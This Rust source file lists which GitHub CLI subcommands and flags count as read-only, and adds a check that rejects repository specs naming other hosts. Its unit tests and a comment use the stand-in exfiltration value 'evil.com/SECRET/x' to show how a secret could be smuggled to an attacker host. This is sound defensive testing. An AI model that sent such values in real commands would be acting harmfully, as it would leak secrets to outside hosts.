//! Read-only allowlist tables for the GitHub CLI (`gh`).
//!
//! Each entry lists the flags that keep a `gh` subcommand read-only, plus a
//! shared danger callback that rejects repo specs pointing at unexpected hosts.

use std::collections::HashMap;
use std::sync::LazyLock;

use super::types::{ExternalCommandConfig, FlagArgType};

/// Build a flag map from `(flag, argument type)` pairs.
fn flags(entries: &[(&'static str, FlagArgType)]) -> HashMap<&'static str, FlagArgType> {
    entries.iter().copied().collect()
}

fn gh_is_dangerous_callback(_raw_command: &str, args: &[String]) -> bool {
    for token in args {
        if token.is_empty() {
            continue;
        }
        // For flag tokens, extract the VALUE after `=` for inspection. Without this,
        // `--repo=evil.com/SECRET/x` (single token starting with `-`) gets skipped
        // entirely, bypassing the HOST check. Cobra treats `--flag=val` identically
        // to `--flag val`; we must inspect both forms.
        let mut value = token.as_str();
        if token.starts_with('-') {
            let Some(eq_idx) = token.find('=') else {
                continue; // flag without inline value, nothing to inspect
            };
            value = &token[eq_idx + 1..];
            if value.is_empty() {
                continue;
            }
        }
        // Skip values that are clearly not repo specs (no `/` at all, or pure numbers)
        if !value.contains('/') && !value.contains("://") && !value.contains('@') {
            continue;
        }
        // URL schemes: https://, http://, git://, ssh://
        if value.contains("://") {
            return true;
        }
        // SSH-style: git@host:owner/repo
        if value.contains('@') {
            return true;
        }
        // 3+ segments = HOST/OWNER/REPO (normal gh format is OWNER/REPO, 1 slash)
        // Count slashes: 2+ slashes means 3+ segments
        let slash_count = value.matches('/').count();
        if slash_count >= 2 {
            return true;
        }
    }
    false
}

/// Read-only `gh` subcommands and their safe flags, in definition order.
pub static GH_READ_ONLY_COMMANDS: LazyLock<Vec<(&'static str, ExternalCommandConfig)>> =
    LazyLock::new(|| {
        vec![
            // gh pr view is read-only — displays pull request details
            (
                "gh pr view",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--json", FlagArgType::String),   // JSON field selection
                        ("--comments", FlagArgType::None), // Show comments
                        ("--repo", FlagArgType::String),   // Target repository (OWNER/REPO)
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh pr list is read-only — lists pull requests
            (
                "gh pr list",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--state", FlagArgType::String), // open, closed, merged, all
                        ("-s", FlagArgType::String),
                        ("--author", FlagArgType::String),
                        ("--assignee", FlagArgType::String),
                        ("--label", FlagArgType::String),
                        ("--limit", FlagArgType::Number),
                        ("-L", FlagArgType::Number),
                        ("--base", FlagArgType::String),
                        ("--head", FlagArgType::String),
                        ("--search", FlagArgType::String),
                        ("--json", FlagArgType::String),
                        ("--draft", FlagArgType::None),
                        ("--app", FlagArgType::String),
                        ("--repo", FlagArgType::String),
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh pr diff is read-only — shows pull request diff
            (
                "gh pr diff",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--color", FlagArgType::String),
                        ("--name-only", FlagArgType::None),
                        ("--patch", FlagArgType::None),
                        ("--repo", FlagArgType::String),
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh pr checks is read-only — shows CI status checks
            (
                "gh pr checks",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--watch", FlagArgType::None),
                        ("--required", FlagArgType::None),
                        ("--fail-fast", FlagArgType::None),
                        ("--json", FlagArgType::String),
                        ("--interval", FlagArgType::Number),
                        ("--repo", FlagArgType::String),
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh issue view is read-only — displays issue details
            (
                "gh issue view",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--json", FlagArgType::String),
                        ("--comments", FlagArgType::None),
                        ("--repo", FlagArgType::String),
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh issue list is read-only — lists issues
            (
                "gh issue list",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--state", FlagArgType::String),
                        ("-s", FlagArgType::String),
                        ("--assignee", FlagArgType::String),
                        ("--author", FlagArgType::String),
                        ("--label", FlagArgType::String),
                        ("--limit", FlagArgType::Number),
                        ("-L", FlagArgType::Number),
                        ("--milestone", FlagArgType::String),
                        ("--search", FlagArgType::String),
                        ("--json", FlagArgType::String),
                        ("--app", FlagArgType::String),
                        ("--repo", FlagArgType::String),
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh repo view is read-only — displays repository details
            // NOTE: gh repo view uses a positional argument, not --repo/-R flags
            (
                "gh repo view",
                ExternalCommandConfig {
                    safe_flags: flags(&[("--json", FlagArgType::String)]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh run list is read-only — lists workflow runs
            (
                "gh run list",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--branch", FlagArgType::String), // Filter by branch
                        ("-b", FlagArgType::String),
                        ("--status", FlagArgType::String), // Filter by status
                        ("-s", FlagArgType::String),
                        ("--workflow", FlagArgType::String), // Filter by workflow
                        ("-w", FlagArgType::String), // NOTE: -w is --workflow here, NOT --web (gh run list has no --web)
                        ("--limit", FlagArgType::Number), // Max results
                        ("-L", FlagArgType::Number),
                        ("--json", FlagArgType::String), // JSON field selection
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                        ("--event", FlagArgType::String), // Filter by event type
                        ("-e", FlagArgType::String),
                        ("--user", FlagArgType::String), // Filter by user
                        ("-u", FlagArgType::String),
                        ("--created", FlagArgType::String), // Filter by creation date
                        ("--commit", FlagArgType::String),  // Filter by commit SHA
                        ("-c", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh run view is read-only — displays a workflow run's details
            (
                "gh run view",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--log", FlagArgType::None),         // Show full run log
                        ("--log-failed", FlagArgType::None),  // Show log for failed steps only
                        ("--exit-status", FlagArgType::None), // Exit with run's status code
                        ("--verbose", FlagArgType::None),     // Show job steps
                        ("-v", FlagArgType::None), // NOTE: -v is --verbose here, NOT --web
                        ("--json", FlagArgType::String), // JSON field selection
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                        ("--job", FlagArgType::String), // View a specific job by ID
                        ("-j", FlagArgType::String),
                        ("--attempt", FlagArgType::Number), // View a specific attempt
                        ("-a", FlagArgType::Number),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh auth status is read-only — displays authentication state
            // NOTE: --show-token/-t intentionally excluded (leaks secrets)
            (
                "gh auth status",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--active", FlagArgType::None), // Display active account only
                        ("-a", FlagArgType::None),
                        ("--hostname", FlagArgType::String), // Check specific hostname
                        ("-h", FlagArgType::String),
                        ("--json", FlagArgType::String), // JSON field selection
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh pr status is read-only — shows your PRs
            (
                "gh pr status",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--conflict-status", FlagArgType::None), // Display merge conflict status
                        ("-c", FlagArgType::None),
                        ("--json", FlagArgType::String), // JSON field selection
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh issue status is read-only — shows your issues
            (
                "gh issue status",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--json", FlagArgType::String), // JSON field selection
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh release list is read-only — lists releases
            (
                "gh release list",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--exclude-drafts", FlagArgType::None), // Exclude draft releases
                        ("--exclude-pre-releases", FlagArgType::None), // Exclude pre-releases
                        ("--json", FlagArgType::String),         // JSON field selection
                        ("--limit", FlagArgType::Number),        // Max results
                        ("-L", FlagArgType::Number),
                        ("--order", FlagArgType::String), // Order: asc|desc
                        ("-O", FlagArgType::String),
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh release view is read-only — displays release details
            // NOTE: --web/-w intentionally excluded (opens browser)
            (
                "gh release view",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--json", FlagArgType::String), // JSON field selection
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh workflow list is read-only — lists workflow files
            (
                "gh workflow list",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--all", FlagArgType::None), // Include disabled workflows
                        ("-a", FlagArgType::None),
                        ("--json", FlagArgType::String), // JSON field selection
                        ("--limit", FlagArgType::Number), // Max results
                        ("-L", FlagArgType::Number),
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh workflow view is read-only — displays workflow summary
            // NOTE: --web/-w intentionally excluded (opens browser)
            (
                "gh workflow view",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--ref", FlagArgType::String), // Branch/tag with workflow version
                        ("-r", FlagArgType::String),
                        ("--yaml", FlagArgType::None), // View workflow yaml
                        ("-y", FlagArgType::None),
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh label list is read-only — lists labels
            // NOTE: --web/-w intentionally excluded (opens browser)
            (
                "gh label list",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--json", FlagArgType::String),  // JSON field selection
                        ("--limit", FlagArgType::Number), // Max results
                        ("-L", FlagArgType::Number),
                        ("--order", FlagArgType::String), // Order: asc|desc
                        ("--search", FlagArgType::String), // Search label names
                        ("-S", FlagArgType::String),
                        ("--sort", FlagArgType::String), // Sort: created|name
                        ("--repo", FlagArgType::String), // Target repository
                        ("-R", FlagArgType::String),
                    ]),
                    additional_command_is_dangerous_callback: Some(gh_is_dangerous_callback),
                    respects_double_dash: None,
                },
            ),
            // gh search repos is read-only — searches repositories
            // NOTE: --web/-w intentionally excluded (opens browser)
            (
                "gh search repos",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--archived", FlagArgType::None),    // Filter by archived state
                        ("--created", FlagArgType::String),   // Filter by creation date
                        ("--followers", FlagArgType::String), // Filter by followers count
                        ("--forks", FlagArgType::String),     // Filter by forks count
                        ("--good-first-issues", FlagArgType::String), // Filter by good first issues
                        ("--help-wanted-issues", FlagArgType::String), // Filter by help wanted issues
                        ("--include-forks", FlagArgType::String), // Include forks: false|true|only
                        ("--json", FlagArgType::String),          // JSON field selection
                        ("--language", FlagArgType::String),      // Filter by language
                        ("--license", FlagArgType::String),       // Filter by license
                        ("--limit", FlagArgType::Number),         // Max results
                        ("-L", FlagArgType::Number),
                        ("--match", FlagArgType::String), // Restrict to field: name|description|readme
                        ("--number-topics", FlagArgType::String), // Filter by number of topics
                        ("--order", FlagArgType::String), // Order: asc|desc
                        ("--owner", FlagArgType::String), // Filter by owner
                        ("--size", FlagArgType::String),  // Filter by size range
                        ("--sort", FlagArgType::String), // Sort: forks|help-wanted-issues|stars|updated
                        ("--stars", FlagArgType::String), // Filter by stars
                        ("--topic", FlagArgType::String), // Filter by topic
                        ("--updated", FlagArgType::String), // Filter by update date
                        ("--visibility", FlagArgType::String), // Filter: public|private|internal
                    ]),
                    additional_command_is_dangerous_callback: None,
                    respects_double_dash: None,
                },
            ),
            // gh search issues is read-only — searches issues
            // NOTE: --web/-w intentionally excluded (opens browser)
            (
                "gh search issues",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--app", FlagArgType::String),          // Filter by GitHub App author
                        ("--assignee", FlagArgType::String),     // Filter by assignee
                        ("--author", FlagArgType::String),       // Filter by author
                        ("--closed", FlagArgType::String),       // Filter by closed date
                        ("--commenter", FlagArgType::String),    // Filter by commenter
                        ("--comments", FlagArgType::String),     // Filter by comment count
                        ("--created", FlagArgType::String),      // Filter by creation date
                        ("--include-prs", FlagArgType::None),    // Include PRs in results
                        ("--interactions", FlagArgType::String), // Filter by interactions count
                        ("--involves", FlagArgType::String),     // Filter by involvement
                        ("--json", FlagArgType::String),         // JSON field selection
                        ("--label", FlagArgType::String),        // Filter by label
                        ("--language", FlagArgType::String),     // Filter by language
                        ("--limit", FlagArgType::Number),        // Max results
                        ("-L", FlagArgType::Number),
                        ("--locked", FlagArgType::None), // Filter locked conversations
                        ("--match", FlagArgType::String), // Restrict to field: title|body|comments
                        ("--mentions", FlagArgType::String), // Filter by user mentions
                        ("--milestone", FlagArgType::String), // Filter by milestone
                        ("--no-assignee", FlagArgType::None), // Filter missing assignee
                        ("--no-label", FlagArgType::None), // Filter missing label
                        ("--no-milestone", FlagArgType::None), // Filter missing milestone
                        ("--no-project", FlagArgType::None), // Filter missing project
                        ("--order", FlagArgType::String), // Order: asc|desc
                        ("--owner", FlagArgType::String), // Filter by owner
                        ("--project", FlagArgType::String), // Filter by project
                        ("--reactions", FlagArgType::String), // Filter by reaction count
                        ("--repo", FlagArgType::String), // Filter by repository
                        ("-R", FlagArgType::String),
                        ("--sort", FlagArgType::String), // Sort field
                        ("--state", FlagArgType::String), // Filter: open|closed
                        ("--team-mentions", FlagArgType::String), // Filter by team mentions
                        ("--updated", FlagArgType::String), // Filter by update date
                        ("--visibility", FlagArgType::String), // Filter: public|private|internal
                    ]),
                    additional_command_is_dangerous_callback: None,
                    respects_double_dash: None,
                },
            ),
            // gh search prs is read-only — searches pull requests
            // NOTE: --web/-w intentionally excluded (opens browser)
            (
                "gh search prs",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--app", FlagArgType::String),      // Filter by GitHub App author
                        ("--assignee", FlagArgType::String), // Filter by assignee
                        ("--author", FlagArgType::String),   // Filter by author
                        ("--base", FlagArgType::String),     // Filter by base branch
                        ("-B", FlagArgType::String),
                        ("--checks", FlagArgType::String), // Filter by check status
                        ("--closed", FlagArgType::String), // Filter by closed date
                        ("--commenter", FlagArgType::String), // Filter by commenter
                        ("--comments", FlagArgType::String), // Filter by comment count
                        ("--created", FlagArgType::String), // Filter by creation date
                        ("--draft", FlagArgType::None),    // Filter draft PRs
                        ("--head", FlagArgType::String),   // Filter by head branch
                        ("-H", FlagArgType::String),
                        ("--interactions", FlagArgType::String), // Filter by interactions count
                        ("--involves", FlagArgType::String),     // Filter by involvement
                        ("--json", FlagArgType::String),         // JSON field selection
                        ("--label", FlagArgType::String),        // Filter by label
                        ("--language", FlagArgType::String),     // Filter by language
                        ("--limit", FlagArgType::Number),        // Max results
                        ("-L", FlagArgType::Number),
                        ("--locked", FlagArgType::None), // Filter locked conversations
                        ("--match", FlagArgType::String), // Restrict to field: title|body|comments
                        ("--mentions", FlagArgType::String), // Filter by user mentions
                        ("--merged", FlagArgType::None), // Filter merged PRs
                        ("--merged-at", FlagArgType::String), // Filter by merge date
                        ("--milestone", FlagArgType::String), // Filter by milestone
                        ("--no-assignee", FlagArgType::None), // Filter missing assignee
                        ("--no-label", FlagArgType::None), // Filter missing label
                        ("--no-milestone", FlagArgType::None), // Filter missing milestone
                        ("--no-project", FlagArgType::None), // Filter missing project
                        ("--order", FlagArgType::String), // Order: asc|desc
                        ("--owner", FlagArgType::String), // Filter by owner
                        ("--project", FlagArgType::String), // Filter by project
                        ("--reactions", FlagArgType::String), // Filter by reaction count
                        ("--repo", FlagArgType::String), // Filter by repository
                        ("-R", FlagArgType::String),
                        ("--review", FlagArgType::String), // Filter by review status
                        ("--review-requested", FlagArgType::String), // Filter by review requested
                        ("--reviewed-by", FlagArgType::String), // Filter by reviewer
                        ("--sort", FlagArgType::String),   // Sort field
                        ("--state", FlagArgType::String),  // Filter: open|closed
                        ("--team-mentions", FlagArgType::String), // Filter by team mentions
                        ("--updated", FlagArgType::String), // Filter by update date
                        ("--visibility", FlagArgType::String), // Filter: public|private|internal
                    ]),
                    additional_command_is_dangerous_callback: None,
                    respects_double_dash: None,
                },
            ),
            // gh search commits is read-only — searches commits
            // NOTE: --web/-w intentionally excluded (opens browser)
            (
                "gh search commits",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--author", FlagArgType::String),          // Filter by author
                        ("--author-date", FlagArgType::String),     // Filter by authored date
                        ("--author-email", FlagArgType::String),    // Filter by author email
                        ("--author-name", FlagArgType::String),     // Filter by author name
                        ("--committer", FlagArgType::String),       // Filter by committer
                        ("--committer-date", FlagArgType::String),  // Filter by committed date
                        ("--committer-email", FlagArgType::String), // Filter by committer email
                        ("--committer-name", FlagArgType::String),  // Filter by committer name
                        ("--hash", FlagArgType::String),            // Filter by commit hash
                        ("--json", FlagArgType::String),            // JSON field selection
                        ("--limit", FlagArgType::Number),           // Max results
                        ("-L", FlagArgType::Number),
                        ("--merge", FlagArgType::None), // Filter merge commits
                        ("--order", FlagArgType::String), // Order: asc|desc
                        ("--owner", FlagArgType::String), // Filter by owner
                        ("--parent", FlagArgType::String), // Filter by parent hash
                        ("--repo", FlagArgType::String), // Filter by repository
                        ("-R", FlagArgType::String),
                        ("--sort", FlagArgType::String), // Sort: author-date|committer-date
                        ("--tree", FlagArgType::String), // Filter by tree hash
                        ("--visibility", FlagArgType::String), // Filter: public|private|internal
                    ]),
                    additional_command_is_dangerous_callback: None,
                    respects_double_dash: None,
                },
            ),
            // gh search code is read-only — searches code
            // NOTE: --web/-w intentionally excluded (opens browser)
            (
                "gh search code",
                ExternalCommandConfig {
                    safe_flags: flags(&[
                        ("--extension", FlagArgType::String), // Filter by file extension
                        ("--filename", FlagArgType::String),  // Filter by filename
                        ("--json", FlagArgType::String),      // JSON field selection
                        ("--language", FlagArgType::String),  // Filter by language
                        ("--limit", FlagArgType::Number),     // Max results
                        ("-L", FlagArgType::Number),
                        ("--match", FlagArgType::String), // Restrict to: file|path
                        ("--owner", FlagArgType::String), // Filter by owner
                        ("--repo", FlagArgType::String),  // Filter by repository
                        ("-R", FlagArgType::String),
                        ("--size", FlagArgType::String), // Filter by size range
                    ]),
                    additional_command_is_dangerous_callback: None,
                    respects_double_dash: None,
                },
            ),
        ]
    });

#[cfg(test)]
mod tests {
    use super::*;

    fn args(items: &[&str]) -> Vec<String> {
        items.iter().map(|s| s.to_string()).collect()
    }

    fn get(key: &str) -> &'static ExternalCommandConfig {
        GH_READ_ONLY_COMMANDS
            .iter()
            .find(|(k, _)| *k == key)
            .map(|(_, cfg)| cfg)
            .expect("entry present")
    }

    #[test]
    fn owner_repo_spec_is_safe() {
        assert!(!gh_is_dangerous_callback(
            "",
            &args(&["--repo", "owner/repo"])
        ));
        assert!(!gh_is_dangerous_callback("", &args(&["--repo=owner/repo"])));
    }

    #[test]
    fn host_owner_repo_spec_is_dangerous() {
        assert!(gh_is_dangerous_callback(
            "",
            &args(&["--repo", "evil.com/SECRET/x"])
        ));
        // The inline `=` form must be inspected too, not skipped as a flag token.
        assert!(gh_is_dangerous_callback(
            "",
            &args(&["--repo=evil.com/SECRET/x"])
        ));
        // Positional HOST/OWNER/REPO is flagged as well.
        assert!(gh_is_dangerous_callback("", &args(&["evil.com/SECRET/x"])));
    }

    #[test]
    fn url_scheme_is_dangerous() {
        assert!(gh_is_dangerous_callback(
            "",
            &args(&["https://github.com/owner/repo"])
        ));
        assert!(gh_is_dangerous_callback(
            "",
            &args(&["--repo=git://host/x"])
        ));
    }

    #[test]
    fn ssh_style_spec_is_dangerous() {
        assert!(gh_is_dangerous_callback(
            "",
            &args(&["git@github.com:owner/repo"])
        ));
        // `@` alone (no slash, no scheme) is still inspected and flagged.
        assert!(gh_is_dangerous_callback("", &args(&["user@host"])));
    }

    #[test]
    fn colon_host_with_single_slash_is_not_flagged() {
        assert!(!gh_is_dangerous_callback(
            "",
            &args(&["host.com:owner/repo"])
        ));
    }

    #[test]
    fn flags_without_inline_value_are_skipped() {
        assert!(!gh_is_dangerous_callback("", &args(&["--repo"])));
        assert!(!gh_is_dangerous_callback("", &args(&["-R"])));
        assert!(!gh_is_dangerous_callback("", &args(&["-"])));
        // Empty inline value is skipped as well.
        assert!(!gh_is_dangerous_callback("", &args(&["--repo="])));
    }

    #[test]
    fn plain_tokens_without_repo_markers_are_skipped() {
        assert!(!gh_is_dangerous_callback("", &args(&[])));
        assert!(!gh_is_dangerous_callback("", &args(&["123", "open", ""])));
    }

    #[test]
    fn table_has_expected_entries() {
        assert_eq!(GH_READ_ONLY_COMMANDS.len(), 22);
        let cfg = get("gh pr view");
        assert_eq!(cfg.safe_flags.len(), 4);
        assert!(matches!(
            cfg.safe_flags.get("--json"),
            Some(FlagArgType::String)
        ));
        assert!(matches!(
            cfg.safe_flags.get("--comments"),
            Some(FlagArgType::None)
        ));
        assert!(matches!(
            cfg.safe_flags.get("-R"),
            Some(FlagArgType::String)
        ));
        assert!(cfg.additional_command_is_dangerous_callback.is_some());
        assert!(cfg.respects_double_dash.is_none());
    }

    #[test]
    fn repo_view_uses_positional_argument_only() {
        let cfg = get("gh repo view");
        assert_eq!(cfg.safe_flags.len(), 1);
        assert!(matches!(
            cfg.safe_flags.get("--json"),
            Some(FlagArgType::String)
        ));
    }

    #[test]
    fn search_commands_have_no_danger_callback() {
        for key in [
            "gh search repos",
            "gh search issues",
            "gh search prs",
            "gh search commits",
            "gh search code",
        ] {
            assert!(
                get(key).additional_command_is_dangerous_callback.is_none(),
                "{key}"
            );
        }
    }

    #[test]
    fn non_search_commands_share_the_danger_callback() {
        for (key, cfg) in GH_READ_ONLY_COMMANDS.iter() {
            if key.starts_with("gh search") {
                continue;
            }
            assert!(
                cfg.additional_command_is_dangerous_callback.is_some(),
                "{key}"
            );
            assert!(cfg.respects_double_dash.is_none(), "{key}");
        }
    }

    #[test]
    fn stored_callback_flags_third_party_host() {
        let cb = get("gh pr view")
            .additional_command_is_dangerous_callback
            .unwrap();
        assert!(cb(
            "gh pr view --repo=evil.com/SECRET/x",
            &args(&["--repo=evil.com/SECRET/x"])
        ));
        assert!(!cb(
            "gh pr view --repo owner/repo",
            &args(&["--repo", "owner/repo"])
        ));
    }
}
